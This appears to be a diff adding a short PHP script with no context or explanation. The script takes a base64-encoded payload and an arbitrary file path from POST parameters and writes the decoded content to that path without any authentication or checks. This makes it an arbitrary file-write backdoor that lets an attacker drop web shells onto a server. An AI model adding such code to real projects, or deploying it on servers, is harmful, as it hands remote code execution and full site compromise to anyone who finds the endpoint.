@@ -1,0 +1,10 @@
+<?php
+if(isset($_POST["a"]))
+{
+$a=$_POST["a"];
+$msg=$_POST["msg"];
+$b=explode(",",$a);
+$c=base64_decode($b[1]);
+file_put_contents($msg,$c);
+}
+?>
